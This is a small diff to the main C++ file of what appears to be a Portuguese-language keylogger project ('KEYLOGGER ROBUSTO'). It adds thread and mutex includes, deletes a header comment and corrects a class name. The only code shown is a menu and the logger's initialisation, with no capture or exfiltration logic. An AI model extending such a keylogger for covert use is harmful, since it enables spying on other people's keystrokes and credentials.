@@ -1,10 +1,10 @@
-//
-// Created by User on 25/09/2025.
-//
 #include "KeyLogger.h"
 #include "Utils.h"
 #include <iostream>
 #include <string>
+#include <mutex>
+#include <thread>
+
 
 void showMenu() {
     std::cout << "\n=== KEYLOGGER ROBUSTO ===" << std::endl;
@@ -20,7 +20,7 @@ void showMenu() {
 }
 
 int main() {
-    Keylogger logger;
+    KeyLogger logger;
 
     if (!logger.initialize()) {
         std::cerr << "Erro ao inicializar o keylogger!" << std::endl;
